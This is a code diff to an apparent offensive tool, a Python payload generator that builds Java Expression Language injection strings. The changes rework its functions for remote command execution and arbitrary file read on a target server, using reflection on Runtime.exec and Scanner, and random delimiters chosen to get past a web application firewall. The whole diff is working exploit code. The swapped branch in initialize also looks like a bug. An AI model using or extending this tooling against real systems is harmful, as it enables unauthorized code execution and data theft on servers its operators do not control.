@@ -126,8 +126,11 @@ class GenPayload:
         self.CONSTRUCTOR_INDEX['File'] = self.findClassConstructorIndex(
             self.FORNAME['File'], "java.io.File(java.lang.String)"
         )
-        self.CONSTRUCTOR_INDEX['Scanner'] = self.findClassConstructorIndex(
+        self.CONSTRUCTOR_INDEX['Scanner@File'] = self.findClassConstructorIndex(
             self.FORNAME['Scanner'], "java.util.Scanner(java.io.File)"
+        )
+        self.CONSTRUCTOR_INDEX['Scanner@InputStream'] = self.findClassConstructorIndex(
+            self.FORNAME['Scanner'], "java.util.Scanner(java.io.InputStream)"
         )
         self.CONSTRUCTOR_INDEX['InputStreamReader'] = self.findClassConstructorIndex(
             self.FORNAME['InputStreamReader'],
@@ -135,15 +138,15 @@ class GenPayload:
         )
         self.CONSTRUCTOR_INDEX['BufferedReader'] = self.findClassConstructorIndex(
             self.FORNAME['BufferedReader'],
-            "java.io.BufferedReader(java.io.InputStreamReader)",
+            "java.io.BufferedReader(java.io.Reader)",
         )
 
     def initialize(self):
         self.genRule()
         if self.STRING_CLASS != "":
-            self.CLASS_CLASS = self.STRING_CLASS + ".getClass()"
-        elif self.ARRAY_CLASS != "":
             self.CLASS_CLASS = self.ARRAY_CLASS + ".getClass()"
+        elif self.ARRAY_CLASS != "":
+            self.CLASS_CLASS = self.STRING_CLASS + ".getClass()"
 
         self.METHODS_INDEX["forName"] = self.findClassMethodIndex(
             self.CLASS_CLASS, "java.lang.Class.forName(java.lang.String)"
@@ -160,6 +163,10 @@ class GenPayload:
         self.initForname()
         self.initMethodsIndex()
         self.initConstructorsIndex()
+
+        # print(self.FORNAME['BufferedReader'])
+        # print(self.CONSTRUCTOR_INDEX['BufferedReader'])
+        # exit()
 
     def genNum(self, num):
         if hasattr(self, self.GEN_NUM_METHOD):
@@ -403,22 +410,22 @@ class GenPayload:
 
         return response, result
 
-    def execPayload(self, command):
-        getRuntimeMethod = self.getMethodIndexFromClass(self.FORNAME['Runtime'], self.METHODS_INDEX['getRuntime'])
-        getRuntime = self.genInvokeMethod(getRuntimeMethod, "null", [])
-        command = command
-        bashPayload = self.genString(command)
-        execPayload = getRuntime + ".exec(" + bashPayload + ").getInputStream()"
+    # def execPayload(self, command):
+    #     getRuntimeMethod = self.getMethodIndexFromClass(self.FORNAME['Runtime'], self.METHODS_INDEX['getRuntime'])
+    #     getRuntime = self.genInvokeMethod(getRuntimeMethod, "null", [])
+    #     bashPayload = self.genString(command)
+    #     execPayload = getRuntime + ".exec(" + bashPayload + ").getInputStream()"
 
-        inputStreamReader = f"{self.FORNAME['InputStreamReader']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['InputStreamReader'])}]"
-        inputStreamPayload = f"{inputStreamReader}.newInstance({execPayload})"
+    #     inputStreamReader = f"{self.FORNAME['InputStreamReader']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['InputStreamReader'])}]"
+    #     inputStreamPayload = f"{inputStreamReader}.newInstance({execPayload})"
 
-        bufferedReader = f"{self.FORNAME['BufferedReader']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['BufferedReader'])}]"
-        innerPayload = f"{bufferedReader}.newInstance({inputStreamPayload}).readLine()"
-        payload = self.genEL(innerPayload)
+    #     bufferedReader = f"{self.FORNAME['BufferedReader']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['BufferedReader'])}]"
+    #     innerPayload = f"{bufferedReader}.newInstance({inputStreamPayload}).readLine()"
 
-        response, result = self.sendPayload(payload)
-        return result
+    #     payload = self.genEL(innerPayload)
+
+    #     response, result = self.sendPayload(payload)
+    #     return result
 
     def execPayloadNoOutput(self, command):
         getRuntimeMethod = self.getMethodIndexFromClass(self.FORNAME['Runtime'], self.METHODS_INDEX['getRuntime'])
@@ -438,8 +445,37 @@ class GenPayload:
         filenamePayload = self.genString(filename)
 
         file = f"{self.FORNAME['File']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['File'])}].newInstance({filenamePayload})"
-        scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner'])}].newInstance({file})"
-        innerPayload = f"{scanner}.next()"
+        scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner@File'])}].newInstance({file})"
+        innerPayload = (
+            f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"
+        )
         payload = self.genEL(innerPayload)
         response, result = self.sendPayload(payload)
-        return result
+        if result in payload:
+            return "Something went wrong when reading file"
+        return result.replace("\\n", '\n')
+
+    def execPayload(self, command):
+        runTime = self.FORNAME['Runtime']
+        execMethod = f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['exec'])}]"
+
+        getRuntimeMethod = f"{runTime}.getMethods()[{self.genNum(self.METHODS_INDEX['getRuntime'])}]"
+
+        execPayload = (
+            f"{execMethod}.invoke({getRuntimeMethod}.invoke(null), {self.genString(command)}).getInputStream()"
+        )
+
+        scanner = f"{self.FORNAME['Scanner']}.getDeclaredConstructors()[{self.genNum(self.CONSTRUCTOR_INDEX['Scanner@InputStream'])}].newInstance({execPayload})"
+
+        innerPayload = (
+            f"{scanner}.useDelimiter({self.genString(utils.randomString(length=5, filtered=self.waf))}).next()"
+        )
+
+        payload = self.genEL(innerPayload)
+
+        response, result = self.sendPayload(payload)
+
+        if result in payload:
+            return "Something went wrong when executing command"
+
+        return result.replace("\\n", '\n')
